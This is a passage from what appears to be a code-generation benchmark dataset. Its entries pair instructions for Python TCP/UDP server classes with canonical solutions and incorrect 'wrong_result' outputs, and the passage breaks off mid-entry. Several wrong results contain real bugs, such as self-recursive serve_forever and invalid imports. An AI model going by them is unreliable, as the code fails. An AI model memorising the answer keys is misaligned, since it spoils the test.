   if msg['is_idle']:\n                        self.state.idle_param_version = self.state.param_version\n\n            def handle_drain(self):\n                drained_size = 0\n                with self.state.dir_lock:\n                    buffer_list = os.listdir(self.state.buffer_dir)\n                    raw_count = len(buffer_list)\n                    assert raw_count == self.state.buffer_size\n                    if (not self.state.force_sequential or raw_count >= self.state.capacity) and raw_count > 0:\n                        old_drain_list = os.listdir(self.state.drain_dir)\n                        for filename in old_drain_list:\n                            filepath = os.path.join(self.state.drain_dir, filename)\n                            os.remove(filepath)\n                        for filename in buffer_list:\n                            src = os.path.join(self.state.buffer_dir, filename)\n                            dst = os.path.join(self.state.drain_dir, filename)\n                            shutil.move(src, dst)\n                        drained_size = raw_count\n                        self.state.buffer_size = 0\n                        logging.info(f'files transferred to trainer: {drained_size}')\n                        logging.info(f'total buffer size: {self.state.buffer_size}')\n                send_msg(self.request, {\n                    'count': drained_size,\n                    'drain_dir': self.state.drain_dir,\n                })\n\n        server = ThreadingTCPServer((host, port), Handler)\n        server.allow_reuse_address = True\n        server.daemon_threads = True\n        logging.info(f'listening on {host}:{port}')\n        server.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 70,
    "wrong_result": "import socket\nimport threading\nfrom dataclasses import dataclass\nfrom typing import Optional, Dict, Any\nimport os\nimport json\nfrom collections import OrderedDict\nfrom threading import Lock\n\n@dataclass\nclass State:\n    buffer_dir: str\n    drain_dir: str\n    capacity: int\n    force_sequential: bool\n\nclass ParameterServer:\n    def __init__(self, buffer_dir: str, drain_dir: str, capacity: int, force_sequential: bool):\n        self.state = State(buffer_dir=buffer_dir, drain_dir=drain_dir, capacity=capacity, force_sequential=force_sequential)\n        self.buffer_dir = buffer_dir\n        self.drain_dir = drain_dir\n        self.capacity = capacity\n        self.force_sequential = force_sequential\n        self.dir_lock = Lock()\n        self.param_lock = Lock()\n        self.buffer_size = 0\n        self.submission_id = 0\n        self.mortal_param: Optional[OrderedDict] = None\n        self.dqn_param: Optional[OrderedDict] = None\n        self.param_version = 0\n        self.idle_param_version = 0\n\n    def start_server(self, host: str, port: int):\n        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        server_socket.bind((host, port))\n        server_socket.listen(5)\n        print(f\"Server started on {host}:{port}\")\n        while True:\n            client_socket, client_address = server_socket.accept()\n            threading.Thread(target=self.handle_client, args=(client_socket,)).start()\n\n    def handle_client(self, client_socket):\n        try:\n            data = client_socket.recv(4096)\n            if not data:\n                return\n            msg = json.loads(data.decode('utf-8'))\n            if msg['type'] == 'get_param':\n                self.handle_get_param(msg, client_socket)\n            elif msg['type'] == 'submit_replay':\n                self.handle_submit_replay(msg, client_socket)\n            elif msg['type'] == 'submit_param':\n                self.handle_submit_param(msg, client_socket)\n            elif msg['type'] == 'drain':\n                self.handle_drain(client_socket)\n        except Exception as e:\n            print(f\"Error handling client: {e}\")\n        finally:\n            client_socket.close()\n\n    def handle_get_param(self, msg, client_socket):\n        param_type = msg.get('param_type')\n        if param_type == 'mortal':\n            with self.param_lock:\n                if self.mortal_param:\n                    response = {'params': dict(self.mortal_param)}\n                    client_socket.send(json.dumps(response).encode('utf-8'))\n                else:\n                    client_socket.send(json.dumps({'error': 'Mortal parameters not available'}).encode('utf-8'))\n        elif param_type == 'dqn':\n            with self.param_lock:\n                if self.dqn_param:\n                    response = {'params': dict(self.dqn_param)}\n                    client_socket.send(json.dumps(response).encode('utf-8'))\n                else:\n                    client_socket.send(json.dumps({'error': 'DQN parameters not available'}).encode('utf-8'))\n        else:\n            client_socket.send(json.dumps({'error': 'Invalid parameter type'}).encode('utf-8'))\n\n    def handle_submit_replay(self, msg, client_socket):\n        with self.dir_lock:\n            submission_id = self.submission_id\n            self.submission_id += 1\n            replay_data = msg.get('replay_data')\n            file_path = os.path.join(self.buffer_dir, f\"replay_{submission_id}.json\")\n            with open(file_path, 'w') as f:\n                json.dump(replay_data, f)\n            self.buffer_size += len(replay_data)\n            if self.buffer_size > self.capacity:\n                self.buffer_size = self.capacity\n            response = {'submission_id': submission_id}\n            client_socket.send(json.dumps(response).encode('utf-8'))\n\n    def handle_submit_param(self, msg, client_socket):\n        param_type = msg.get('param_type')\n        params = msg.get('params')\n        with self.param_lock:\n            if param_type == 'mortal':\n                self.mortal_param = OrderedDict(params)\n            elif param_type == 'dqn':\n                self.dqn_param = OrderedDict(params)\n            self.param_version += 1\n            response = {'version': self.param_version}\n            client_socket.send(json.dumps(response).encode('utf-8'))\n\n    def handle_drain(self, client_socket):\n        with self.dir_lock:\n            for filename in os.listdir(self.buffer_dir):\n                src = os.path.join(self.buffer_dir, filename)\n                dst = os.path.join(self.drain_dir, filename)\n                os.rename(src, dst)\n            for filename in os.listdir(self.buffer_dir):\n                os.remove(os.path.join(self.buffer_dir, filename))\n            self.buffer_size = 0\n            response = {'drain_complete': True}\n            client_socket.send(json.dumps(response).encode('utf-8'))"
  },
  {
    "Task_id": 409,
    "Instruction": "Task Description: Create a TCP server that handles both video streaming and sensor data processing concurrently, using separate ports for each type of data. The server should process video frames for object detection and control an RC car based on sensor inputs and detected objects.\n\nClass Description: Server - A class that manages two TCP servers running on different ports, one for video stream processing and another for sensor data handling. It uses multithreading to handle both servers concurrently.\n\nAttributes:\n- host: str - The host address where the server will run.\n- port1: int - The port number for the video stream server.\n- port2: int - The port number for the sensor data server.\n\nMethods:\n- video_stream(host: str, port: int) -> None - Starts a TCP server for video stream processing using the VideoStreamHandler class.\n- sensor_stream(host: str, port: int) -> None - Starts a TCP server for sensor data processing using the SensorDataHandler class.\n- start() -> None - Initializes and starts both servers in separate threads, with the sensor server running as a daemon thread.\n\nClass Description: VideoStreamHandler - A handler class for processing video streams, inheriting from socketserver.StreamRequestHandler. It performs object detection and controls an RC car based on the processed video frames and sensor data.\n\nAttributes:\n- nn: NeuralNetwork - A neural network model for image prediction.\n- obj_detection: ObjectDetection - An object detection utility.\n- rc_car: RCControl - An interface for controlling the RC car.\n- stop_cascade: cv2.CascadeClassifier - A classifier for detecting stop signs.\n- light_cascade: cv2.CascadeClassifier - A classifier for detecting traffic lights.\n- d_to_camera: DistanceToCamera - A utility for calculating distances to detected objects.\n- d_sensor_thresh: int - Threshold distance for sensor-based stopping.\n- d_stop_light_thresh: int - Threshold distance for stop sign and traffic light detection.\n- d_stop_sign: float - Current distance to the nearest stop sign.\n- d_light: float - Current distance to the nearest traffic light.\n- stop_start: int - Timestamp when stopping begins.\n- stop_finish: int - Timestamp when stopping ends.\n- stop_time: float - Duration of the stop.\n- drive_time_after_stop: float - Time driven after a stop.\n\nMethods:\n- __init__(request, client_address, server) -> None - Initializes the handler with necessary models and parameters.\n- handle() -> None - Processes incoming video stream, performs object detection, and controls the RC car based on the detected objects and sensor data.\n\nClass Description: SensorDataHandler - A handler class for processing sensor data, inheriting from socketserver.BaseRequestHandler. It reads and processes sensor data received from the client.\n\nAttributes: None\n\nMethods:\n- handle() -> None - Continuously reads sensor data from the client, updates the global sensor_data variable, and prints the received data.",
    "Canonical_solution": "import cv2\nimport sys\nimport threading\nimport socketserver\nimport numpy as np\n\nclass SensorDataHandler(socketserver.BaseRequestHandler):\n    def handle(self):\n        global sensor_data\n        while True:\n            data = self.request.recv(1024)\n            if not data:\n                break\n            sensor_data = round(float(data), 1)\n            print(sensor_data)\n\nclass VideoStreamHandler(socketserver.StreamRequestHandler):\n    def __init__(self, request, client_address, server):\n        self.nn = NeuralNetwork()\n        self.nn.load_model(\"saved_model/nn_model.xml\")\n        self.obj_detection = ObjectDetection()\n        self.rc_car = RCControl(\"/dev/tty.usbmodem1421\")\n        self.stop_cascade = cv2.CascadeClassifier(\"cascade_xml/stop_sign.xml\")\n        self.light_cascade = cv2.CascadeClassifier(\"cascade_xml/traffic_light.xml\")\n        self.d_to_camera = DistanceToCamera()\n        self.d_sensor_thresh = 30\n        self.d_stop_light_thresh = 25\n        self.d_stop_sign = self.d_stop_light_thresh\n        self.d_light = self.d_stop_light_thresh\n        self.stop_start = 0\n        self.stop_finish = 0\n        self.stop_time = 0\n        self.drive_time_after_stop = 0\n        super().__init__(request, client_address, server)\n\n    def handle(self):\n        global sensor_data\n        stream_bytes = b' '\n        stop_flag = False\n        stop_sign_active = True\n\n        try:\n            while True:\n                stream_bytes += self.rfile.read(1024)\n                first = stream_bytes.find(b'\\xff\\xd8')\n                last = stream_bytes.find(b'\\xff\\xd9')\n                if first != -1 and last != -1:\n                    jpg = stream_bytes[first:last + 2]\n                    stream_bytes = stream_bytes[last + 2:]\n                    gray = cv2.imdecode(np.frombuffer(jpg, dtype=np.uint8), cv2.IMREAD_GRAYSCALE)\n                    image = cv2.imdecode(np.frombuffer(jpg, dtype=np.uint8), cv2.IMREAD_COLOR)\n\n                    height, width = gray.shape\n                    roi = gray[int(height/2):height, :]\n\n                    v_param1 = self.obj_detection.detect(self.stop_cascade, gray, image)\n                    v_param2 = self.obj_detection.detect(self.light_cascade, gray, image)\n\n                    if v_param1 > 0 or v_param2 > 0:\n                        d1 = self.d_to_camera.calculate(v_param1, 5.5, 300, image)\n                        d2 = self.d_to_camera.calculate(v_param2, 5.5, 100, image)\n                        self.d_stop_sign = d1\n                        self.d_light = d2\n\n                    image_array = roi.reshape(1, int(height/2) * width).astype(np.float32)\n                    prediction = self.nn.predict(image_array)\n\n                    if sensor_data and int(sensor_data) < self.d_sensor_thresh:\n                        self.rc_car.stop()\n                        sensor_data = None\n                    elif 0 < self.d_stop_sign < self.d_stop_light_thresh and stop_sign_active:\n                        self.rc_car.stop()\n                        if not stop_flag:\n                            self.stop_start = cv2.getTickCount()\n                            stop_flag = True\n                        self.stop_finish = cv2.getTickCount()\n                        self.stop_time = (self.stop_finish - self.stop_start) / cv2.getTickFrequency()\n                        if self.stop_time > 5:\n                            stop_flag = False\n                            stop_sign_active = False\n                    elif 0 < self.d_light < self.d_stop_light_thresh:\n                        if self.obj_detection.red_light:\n                            self.rc_car.stop()\n                        self.d_light = self.d_stop_light_thresh\n                        self.obj_detection.red_light = False\n                    else:\n                        self.rc_car.steer(prediction)\n                        self.stop_start = cv2.getTickCount()\n                        self.d_stop_sign = self.d_stop_light_thresh\n                        if not stop_sign_active:\n                            self.drive_time_after_stop = (self.stop_start - self.stop_finish) / cv2.getTickFrequency()\n                            if self.drive_time_after_stop > 5:\n                                stop_sign_active = True\n\n                    if cv2.waitKey(1) & 0xFF == ord('q'):\n                        self.rc_car.stop()\n                        break\n        finally:\n            cv2.destroyAllWindows()\n            sys.exit()\n\nclass Server:\n    def __init__(self, host, port1, port2):\n        self.host = host\n        self.port1 = port1\n        self.port2 = port2\n\n    def video_stream(self, host, port):\n        s = socketserver.TCPServer((host, port), VideoStreamHandler)\n        s.serve_forever()\n\n    def sensor_stream(self, host, port):\n        s = socketserver.TCPServer((host, port), SensorDataHandler)\n        s.serve_forever()\n\n    def start(self):\n        sensor_thread = threading.Thread(target=self.sensor_stream, args=(self.host, self.port2))\n        sensor_thread.daemon = True\n        sensor_thread.start()\n        self.video_stream(self.host, self.port1)",
    "Code_level": "Class-level",
    "FSMID_for_test": 70,
    "wrong_result": "import socketserver\nimport threading\nimport numpy as np\nimport cv2\nimport time\n\nclass Server:\n    def __init__(self, host, port1, port2):\n        self.host = host\n        self.port1 = port1\n        self.port2 = port2\n\n    def video_stream(self, host, port):\n        with socketserver.TCPServer((host, port), VideoStreamHandler) as server:\n            server.serve_forever()\n\n    def sensor_stream(self, host, port):\n        with socketserver.TCPServer((host, port), SensorDataHandler) as server:\n            server.serve_forever()\n\n    def start(self):\n        video_thread = threading.Thread(target=self.video_stream, args=(self.host, self.port1))\n        sensor_thread = threading.Thread(target=self.sensor_stream, args=(self.host, self.port2))\n        sensor_thread.daemon = True\n        video_thread.start()\n        sensor_thread.start()\n\nclass VideoStreamHandler(socketserver.StreamRequestHandler):\n    def __init__(self, request, client_address, server):\n        self.nn = NeuralNetwork()\n        self.obj_detection = ObjectDetection()\n        self.rc_car = RCControl()\n        self.stop_cascade = cv2.CascadeClassifier('stop_cascade.xml')\n        self.light_cascade = cv2.CascadeClassifier('light_cascade.xml')\n        self.d_to_camera = DistanceToCamera()\n        self.d_sensor_thresh = 10\n        self.d_stop_light_thresh = 5\n        self.d_stop_sign = 0.0\n        self.d_light = 0.0\n        self.stop_start = 0\n        self.stop_finish = 0\n        self.stop_time = 0.0\n        self.drive_time_after_stop = 0.0\n        super().__init__(request, client_address, server)\n\n    def handle(self):\n        while True:\n            data = self.rfile.read(4096)\n            if not data:\n                break\n            img = cv2.imdecode(np.frombuffer(data, dtype=np.uint8), cv2.IMREAD_COLOR)\n            # Object detection and processing logic\n            # Control RC car based on detected objects and sensor data\n            # Placeholder for actual implementation\n\nclass SensorDataHandler(socketserver.BaseRequestHandler):\n    def handle(self):\n        global sensor_data\n        while True:\n            data = self.request.recv(1024)\n            if not data:\n                break\n            sensor_data = data.decode()\n            print(\"Received sensor data:\", sensor_data)\n\nsensor_data = \"\""
  },
  {
    "Task_id": 411,
    "Instruction": "Task Description: Implement a threaded TCP server in Python that handles client connections and messages, allowing for bidirectional communication while maintaining only one active client connection at a time.\n\nClass Description: MessageServer is a threaded TCP server that inherits from SocketServer.ThreadingTCPServer. It manages client connections, processes incoming messages, and provides methods for sending messages to the connected client. The server runs in a separate daemon thread and maintains state about the current client connection.\n\nAttributes:\n- server_thread: [Thread] - The thread in which the server runs\n- request_verified: [Event] - Event flag indicating whether a client connection has been verified\n- _client_socket: [socket] - The socket object of the currently connected client (None if no client is connected)\n- message_handled: [Event] - Event flag indicating when a message has been processed\n\nMethods:\n- __init__(server_address) -> [None] - Initializes the server with the given address and starts the server thread\n- send(message) -> [None] - Sends a message to the connected client if one exists\n- get_client_socket() -> [socket] - Returns the client socket after waiting for a connection to be verified\n- verify_request(request, client_address) -> [bool] - Verifies and accepts/rejects incoming connections (allows only one active connection)\n\nClass Description: MessageTCPHandler is a request handler class that inherits from SocketServer.BaseRequestHandler. It processes incoming messages from clients and manages the communication loop.\n\nAttributes: (inherits from BaseRequestHandler)\n- request: [socket] - The client connection socket\n- client_address: [tuple] - The client address\n- server: [MessageServer] - Reference to the server instance\n\nMethods:\n- handle() -> [None] - Main handler method that processes incoming messages in a loop, handles disconnections, and manages communication with the client",
    "Canonical_solution": "import threading\nimport logging\nimport sys\nimport socket\nimport unrealcv\nif (sys.version_info > (3, 0)):\n    import socketserver as SocketServer\nelse:\n    import SocketServer\n\nSocketServer.ThreadingMixIn.daemon_threads = True\nSocketServer.TCPServer.allow_reuse_address = True\n\nlogger = logging.getLogger(__name__)\nlogger.setLevel(logging.DEBUG)\nlogger.addHandler(logging.StreamHandler(sys.stdout))\n\nclass MessageTCPHandler(SocketServer.BaseRequestHandler):\n    def handle(self):\n        assert self.request != None\n\n        while True:\n            try:\n                logger.debug('Start to handle message')\n                self.server.message_handled.clear()\n                message = unrealcv.SocketMessage.ReceivePayload(self.request)\n\n                if message:\n                    unrealcv.SocketMessage.WrapAndSendPayload(self.request, message)\n                    self.server.message_handled.set()\n                else:\n                    logger.debug('Client release connection')\n                    self.server._client_socket = None\n                    self.server.message_handled.set()\n                    break\n            except Exception as e:\n                if e.errno == 10054:\n                    logger.debug('Remote connection is forcibly closed')\n                    self.server._client_socket = None\n                    self.server.message_handled.set()\n                else:\n                    logger.debug('Unknown exception %s' % str(e))\n                    self.server.message_handled.set()\n\nclass MessageServer(SocketServer.ThreadingTCPServer):\n    def __init__(self, server_address):\n        super(MessageServer, self).__init__(server_address, MessageTCPHandler)\n        \n        def server_thread():\n            cur_thread = threading.current_thread()\n            logger.info('Started in thread %s' % cur_thread.name)\n            self.serve_forever()\n            logger.info(\"The server thread is stopped\")\n\n        self.server_thread = threading.Thread(target=server_thread)\n        self.server_thread.setDaemon(1)\n        self.server_thread.start()\n        \n        self.request_verified = threading.Event()\n        self._client_socket = None\n        self.message_handled = threading.Event()\n\n    def send(self, message):\n        if self._client_socket:\n            unrealcv.SocketMessage.WrapAndSendPayload(self._client_socket, message)\n\n    def get_client_socket(self):\n        self.request_verified.wait()\n        logger.debug('Return client socket')\n        return self._client_socket\n\n    def verify_request(self, request, client_address):\n        logger.debug('Got a connection from %s' % str(client_address))\n        if self._client_socket:\n            logger.debug('Reject, only accept one connection')\n            accepted = False\n        else:\n            logger.debug('Accept, new connection')\n            self._client_socket = request\n            unrealcv.SocketMessage.WrapAndSendPayload(self._client_socket, 'connected to Python Message Server')\n            accepted = True\n\n        self.request_verified.set()\n        return accepted",
    "Code_level": "Class-level",
    "FSMID_for_test": 70,
    "wrong_result": "import socket\nimport threading\nfrom socketserver import ThreadingTCPServer, BaseRequestHandler\n\nclass MessageServer(ThreadingTCPServer):\n    def __init__(self, server_address):\n        super().__init__(server_address, MessageTCPHandler)\n        self.server_thread = threading.Thread(target=self.run_server)\n        self.server_thread.daemon = True\n        self.server_thread.start()\n        self.request_verified = threading.Event()\n        self._client_socket = None\n        self.message_handled = threading.Event()\n\n    def run_server(self):\n        self.serve_forever()\n\n    def send(self, message):\n        if self._client_socket is not None:\n            self._client_socket.sendall(message.encode())\n\n    def get_client_socket(self):\n        self.request_verified.wait()\n        return self._client_socket\n\n    def verify_request(self, request, client_address):\n        if self._client_socket is not None:\n            return False\n        return True\n\nclass MessageTCPHandler(BaseRequestHandler):\n    def handle(self):\n        if not self.server.verify_request(self.request, self.client_address):\n            self.request.close()\n            return\n        self.server._client_socket = self.request\n        self.server.request_verified.set()\n        \n        while True:\n            data = self.request.recv(1024)\n            if not data:\n                self.request.close()\n                self.server._client_socket = None\n                self.server.request_verified.clear()\n                break\n            self.server.message_handled.set()\n            self.request.sendall(data)"
  },
  {
    "Task_id": 414,
    "Instruction": "Task Description: Implement a TCP server for clock synchronization that responds to client requests with the current time provided by a time function.\n\nClass Description: The system consists of three classes working together to create a threaded TCP server that handles time synchronization requests. The server responds to \"sync\" messages with the current timestamp.\n\nAttributes:\n\nserver: [Time_Echo_Server] - The TCP server instance handling client connections\nthread: [threading.Thread] - The thread running the server's serve_forever loop\n\nMethods:\n\n__init__: [Name](time_fn: callable) -> [None] - Initializes the clock synchronization server with a time-providing function\nstop: [Name]() -> [None] - Shuts down the server and joins the server thread\nport: [property]() -> [int] - Returns the port number the server is bound to (read-only)\nhost: [property]() -> [str] - Returns the host address the server is bound to (read-only)",
    "Canonical_solution": "import socket\nimport socketserver\nimport struct\nimport threading\nfrom functools import partial\n\nclass Time_Echo(socketserver.BaseRequestHandler):\n    def __init__(self, *args, time_fn, **kwargs):\n        self.time_fn = time_fn\n        super().__init__(*args, **kwargs)\n\n    def handle(self):\n        while True:\n            data = self.request.recv(4)\n            if not data:\n                break\n            if data.decode(\"utf-8\") == \"sync\":\n                self.request.send(struct.pack(\"<d\", self.time_fn()))\n\nclass Time_Echo_Server(socketserver.ThreadingTCPServer):\n    def __init__(self, *, time_fn, host=\"\", **kwargs):\n        handler_class = partial(Time_Echo, time_fn=time_fn)\n        super().__init__((host, 0), handler_class, **kwargs)\n        self.allow_reuse_address = True\n\n    @property\n    def host(self) -> str:\n        return self.server_address[0]\n\n    @property\n    def port(self) -> int:\n        return self.server_address[1]\n\nclass Clock_Sync_Server:\n    def __init__(self, time_fn):\n        self.server = Time_Echo_Server(time_fn=time_fn)\n        self.thread = threading.Thread(target=self.server.serve_forever)\n        self.thread.start()\n\n    def stop(self):\n        self.server.shutdown()\n        self.thread.join()\n\n    @property\n    def port(self):\n        return self.server.port\n\n    @property\n    def host(self):\n        return self.server.host",
    "Code_level": "Class-level",
    "FSMID_for_test": 70,
    "wrong_result": "import socketserver\nimport threading\n\nclass Time_Echo_Server:\n    def __init__(self, time_fn):\n        self.time_fn = time_fn\n        self.host = 'localhost'\n        self.port = 12345\n        self.server = socketserver.ThreadingTCPServer((self.host, self.port), self.MyHandler)\n        self.thread = threading.Thread(target=self.server.serve_forever)\n        self.thread.start()\n\n    class MyHandler(socketserver.BaseRequestHandler):\n        def handle(self):\n            data = self.request.recv(1024).strip()\n            if data == 'sync':\n                current_time = self.server.time_fn()\n                self.request.sendall(str(current_time).encode())\n\n    @property\n    def host(self):\n        return self.server.server_address[0]\n\n    @property\n    def port(self):\n        return self.server.server_address[1]\n\n    def stop(self):\n        self.server.shutdown()\n        self.thread.join()"
  },
  {
    "Task_id": 417,
    "Instruction": "Task Description: Implement a TCP server in Python using the socketserver module to handle client requests, process data, and send responses back to the client.\n\nClass Description: The TCPServer class initializes and manages a TCP server that listens for client connections, processes incoming data, and sends appropriate responses. The EchoRequestHandler class handles individual client requests by processing received data and generating responses.\n\nAttributes:\n- port: int - The port number on which the server will listen for incoming connections.\n- server: socketserver.TCPServer - The instance of the TCP server that handles client connections.\n\nMethods:\n- __init__(port: int) -> None - Initializes the TCPServer instance with the specified port number.\n- start() -> None - Starts the TCP server, binds it to 'localhost' and the specified port, and begins listening for client connections indefinitely.\n- stop() -> None - Shuts down the TCP server if it is running.\n\nClass Description: The EchoRequestHandler class inherits from socketserver.BaseRequestHandler and defines how to handle incoming client requests.\n\nMethods:\n- handle() -> None - Processes the client's request by receiving data, decoding it, and performing actions based on the received data (either learning or classifying). It then sends a response back to the client. The method uses the following steps:\n  1. Receives data from the client using recv().\n  2. Decodes the data from UTF-8 format.\n  3. Parses the data to extract group and filename.\n  4. Depending on the presence of a filename, either performs a learning operation or a classification operation.\n  5. Encodes the result as JSON and sends it back to the client using send().",
    "Canonical_solution": "import json\nimport socketserver\nimport pickle\nimport numpy\nfrom random import shuffle\n\nclass EchoRequestHandler(socketserver.BaseRequestHandler):\n    def handle(self):\n        data = self.request.recv(1024)\n        data = data.decode('utf-8').strip()\n        print(\"received data:'%s'\" % data)\n        group = data.split('=')[0].strip()\n        filename = data.split('=')[1].strip()\n        payload = \"error\".encode('utf-8')\n        if len(group) == 0:\n            self.request.send(payload)\n            return\n        randomF = RF()\n        if len(filename) == 0:\n            payload = json.dumps(randomF.learn(group, 0.9)).encode('utf-8')\n        else:\n            payload = json.dumps(\n                randomF.classify(\n                    group,\n                    filename +\n                    \".rftemp\")).encode('utf-8')\n        self.request.send(payload)\n        return\n\nclass TCPServer:\n    def __init__(self, port):\n        self.port = port\n        self.server = None\n\n    def start(self):\n        socketserver.TCPServer.allow_reuse_address = True\n        address = ('localhost', self.port)\n        self.server = socketserver.TCPServer(address, EchoRequestHandler)\n        self.server.serve_forever()\n\n    def stop(self):\n        if self.server:\n            self.server.shutdown()",
    "Code_level": "Class-level",
    "FSMID_for_test": 70,
    "wrong_result": "import socketserver\nimport json\n\nclass TCPServer:\n    def __init__(self, port):\n        self.port = port\n        self.server = socketserver.TCPServer(('localhost', port), EchoRequestHandler)\n\n    def start(self):\n        self.server.serve_forever()\n\n    def stop(self):\n        self.server.shutdown()\n\nclass EchoRequestHandler(socketserver.BaseRequestHandler):\n    def handle(self):\n        data = self.request.recv(1024)\n        decoded_data = data.decode('utf-8')\n        parts = decoded_data.split(',')\n        group = parts[0]\n        if len(parts) > 1:\n            filename = parts[1]\n            result = {\"status\": \"classified\", \"group\": group, \"filename\": filename}\n        else:\n            result = {\"status\": \"learned\", \"group\": group}\n        response = json.dumps(result).encode('utf-8')\n        self.request.sendall(response)"
  },
  {
    "Task_id": 419,
    "Instruction": "Task Description: Implement a TCP server using Twisted framework in Python that supports WebSocket connections, handles incoming data, and manages connection lifecycle events.\n\nClass Description: The solution consists of two classes: `HelloServerProtocol` (handles protocol-level operations) and `HelloServerFactory` (manages server configuration and startup).\n\nAttributes:\n\n- `HelloServerProtocol`:\n  - transport: [object] - Twisted transport object representing the connection\n- `HelloServerFactory`:\n  - host: [str] - Server host address (default: \"127.0.0.1\")\n  - port: [int] - Server port number (default: 9000)\n  - wrappedFactory: [object] - Twisted Factory instance for protocol handling\n  - factory: [object] - WebSocket-wrapped factory instance\n\nMethods:\n\n- `HelloServerProtocol`:\n  - connectionMade() -> None - Called when a new connection is established\n  - dataReceived(data: bytes) -> None - Called when data is received from client\n- `HelloServerFactory`:\n  - __init__(host: str = \"127.0.0.1\", port: int = 9000, enableCompression: bool = False, autoFragmentSize: int = 1024) -> None - Initializes factory with configuration\n  - start() -> None - Starts the TCP server and enters event loop",
    "Canonical_solution": "from twisted.internet.protocol import Protocol, Factory\nfrom twisted.internet import reactor\nfrom autobahn.twisted.websocket import WrappingWebSocketServerFactory\n\nclass HelloServerProtocol(Protocol):\n    def connectionMade(self):\n        print(\"connectionMade\", self.transport.getHost(), self.transport.getPeer())\n        self.transport.write('how are you?' * 100)\n\n    def dataReceived(self, data):\n        print(\"dataReceived: {}\".format(data))\n\nclass HelloServerFactory:\n    def __init__(self, host=\"127.0.0.1\", port=9000, enableCompression=False, autoFragmentSize=1024):\n        self.host = host\n        self.port = port\n        self.wrappedFactory = Factory.forProtocol(HelloServerProtocol)\n        self.factory = WrappingWebSocketServerFactory(\n            self.wrappedFactory,\n            f\"ws://{self.host}:{self.port}\",\n            enableCompression=enableCompression,\n            autoFragmentSize=autoFragmentSize\n        )\n\n    def start(self):\n        reactor.listenTCP(self.port, self.factory)\n        reactor.run()",
    "Code_level": "Class-level",
    "FSMID_for_test": 68,
    "wrong_result": "from twisted.internet import protocol, reactor\nfrom twisted.web import websocket\n\nclass HelloServerProtocol(websocket.WebSocketServerProtocol):\n    def connectionMade(self):\n        super().connectionMade()\n        self.sendMessage(b\"Welcome to the WebSocket server!\")\n\n    def messageReceived(self, message):\n        print(\"Received:\", message.decode())\n        self.sendMessage(b\"Echo: \" + message)\n\nclass HelloServerFactory(protocol.Factory):\n    def __init__(self, host=\"127.0.0.1\", port=9000, enableCompression=False, autoFragmentSize=1024):\n        self.host = host\n        self.port = port\n        self.enableCompression = enableCompression\n        self.autoFragmentSize = autoFragmentSize\n        self.wrappedFactory = protocol.Factory()\n\n    def buildProtocol(self, addr):\n        return HelloServerProtocol()\n\n    def start(self):\n        reactor.listenTCP(self.port, self)\n        reactor.run()"
  },
  {
    "Task_id": 420,
    "Instruction": "Task Description: Implement a UDP server in Python using the socketserver module to handle client requests and send responses.\n\nClass Description: The solution consists of two classes: TimeHandler (request handler) and UDPServerWrapper (server wrapper). TimeHandler processes incoming UDP requests and sends back the current time, while UDPServerWrapper manages the UDP server lifecycle.\n\nAttributes:\n- host: str - The host address to bind the server to (default: '' - all interfaces)\n- port: int - The port number to bind the server to (default: 20000)\n- server: UDPServer - The UDP server instance created with the specified host and port\n\nMethods:\n- __init__(host: str = '', port: int = 20000) -> None - Initializes the UDPServerWrapper with host and port, creates a UDPServer instance with TimeHandler\n- serve_forever() -> None - Starts the UDP server and keeps it running indefinitely to handle incoming requests\n\nThe TimeHandler class (inherits from BaseRequestHandler) contains:\n- handle() -> None - Processes each incoming request, prints client info, gets current time, and sends response back to client",
    "Canonical_solution": "from socketserver import BaseRequestHandler, UDPServer\nimport time\n\nclass TimeHandler(BaseRequestHandler):\n    def handle(self):\n        print('Got connection from', self.client_address)\n        msg, sock = self.request\n        resp = time.ctime()\n        sock.sendto(resp.encode('ascii'), self.client_address)\n\nclass UDPServerWrapper:\n    def __init__(self, host='', port=20000):\n        self.host = host\n        self.port = port\n        self.server = UDPServer((self.host, self.port), TimeHandler)\n\n    def serve_forever(self):\n        self.server.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 72,
    "wrong_result": "import socketserver\nimport datetime\n\nclass TimeHandler(socketserver.DatagramRequestHandler):\n    def handle(self):\n        current_time = datetime.datetime.now().strftime(\"%Y-%m-%d %H:%M:%S\")\n        self.wfile.write(current_time.encode('utf-8'))\n\nclass UDPServerWrapper(socketserver.DatagramServer):\n    def __init__(self, host: str = '', port: int = 20000):\n        super().__init__((host, port), TimeHandler)\n        self.server = self\n\n    def serve_forever(self):\n        self.serve_forever()"
  },
  {
    "Task_id": 423,
    "Instruction": "Task Description: Create a UDP-based relay class for HoloLens communication that handles both receiving data from HoloLens and forwarding it via ZeroMQ, as well as receiving commands from ZeroMQ and sending responses back to HoloLens.\n\nClass Description: Hololens_Relay is a class that establishes a bidirectional communication bridge between a HoloLens device (via UDP) and other processes (via ZeroMQ). It manages socket connections, message routing, and protocol handling for gaze data and calibration results.\n\nAttributes:\n- context: [zmq.Context] - ZeroMQ context for IPC communication\n- thread_pipe: [zmq.Socket] - Pipe for communicating with the worker thread\n- host: [str] - Host address for UDP binding\n- port: [str] - Port number for UDP binding\n- ipc_push_url: [str] - ZeroMQ URL for pushing messages\n- ipc_sub_url: [str] - ZeroMQ URL for subscribing to messages\n- gaze_receiver: [tuple] - Address of the current gaze data receiver\n- calib_result_receiver: [tuple] - Address of the current calibration result receiver\n\nMethods:\n- __init__(zmq_ctx, ipc_push_url, ipc_sub_url, port=\"50021\", host=\"\") -> [None] - Initializes the relay with ZMQ context and connection URLs\n- start_server(new_address) -> [bool] - Binds the UDP socket to the specified address and starts the server\n- stop_server() -> [None] - Stops the server and cleans up resources\n- thread_loop(context, pipe) -> [None] - Main worker thread that handles message polling and routing (private method)\n- on_recv(socket, ipc_pub) -> [None] - Handles incoming UDP messages and generates appropriate responses (private method)",
